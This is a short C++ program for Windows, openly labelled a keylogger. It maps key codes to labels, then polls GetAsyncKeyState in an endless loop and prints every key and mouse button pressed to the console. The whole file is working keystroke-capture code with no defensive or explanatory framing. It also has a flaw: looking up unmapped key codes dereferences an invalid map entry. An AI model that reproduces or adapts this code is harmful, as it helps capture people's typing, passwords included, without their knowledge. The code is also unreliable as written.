#include<iostream>
#include<map>
#include<windows.h>
#include<winuser.h>

#define KEY_INTERVAL 170

using namespace std;

map < int, string > keys;

void set_keys_to_register() {

    // Just some keys mappable

    int key;

    // Mouse clicks

    keys[VK_LBUTTON] = "<lclick>";
    keys[VK_RBUTTON] = "<rclick>";
    keys[VK_MBUTTON] = "<mclick>";

    // Special keys

    keys[VK_BACK] = "<backspace>";
    keys[VK_TAB] = "<tab>";
    keys[VK_RETURN] = "<enter>";
    keys[VK_SHIFT] = "<shift>";
    keys[VK_CONTROL] = "<ctrl>";
    keys[VK_MENU] = "<alt>";
    keys[VK_ESCAPE] = "<esc>";
    keys[VK_SPACE] = "<spacebar>";
    keys[VK_CAPITAL] = "<caps-lock>";
    keys[VK_PRIOR] = "<page-up>";
    keys[VK_NEXT] = "<page-down>";
    keys[VK_END] = "<end>";
    keys[VK_HOME] = "<home>";
    keys[VK_LEFT] = "<left-arrow>";
    keys[VK_RIGHT] = "<right-arrow>";
    keys[VK_UP] = "<up-arrow>";
    keys[VK_DOWN] = "<down-arrow>";
    keys[VK_INSERT] = "<insert>";
    keys[VK_DELETE] = "<delete>";

    // Numbers

    for (key = 0x30; key < 0x3A; key++) {
        keys[key] = key;
    }

    // Letters

    for (key = 0x41; key < 0x5B; key++) {
        keys[key] = char(key);
    }

}

void launch_keylogger() {

    int active = 1, key;

    while (active) {
        for (key = 0x01; key < 0xFF; key++) {
            if (GetAsyncKeyState(key)) {
                cout << keys.find(key) -> second;
                Sleep(KEY_INTERVAL);
            }
        }
    }

}

int main() {

    set_keys_to_register();

    launch_keylogger();

    return 0;

}
